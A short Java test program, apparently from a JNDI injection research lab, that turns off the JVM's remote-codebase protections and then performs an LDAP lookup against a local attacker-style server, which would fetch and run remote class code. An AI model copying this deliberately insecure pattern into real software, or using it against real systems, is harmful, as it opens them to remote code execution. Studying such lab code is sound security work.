package com.trganda.jndi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Properties;

public class Test {
    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");

        Properties properties = new Properties();
        properties.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");

        Context context = new InitialContext(properties);
        Object object = context.lookup("ldap://192.168.1.7:1389/ikbteq");
        System.out.println(object);
    }
}
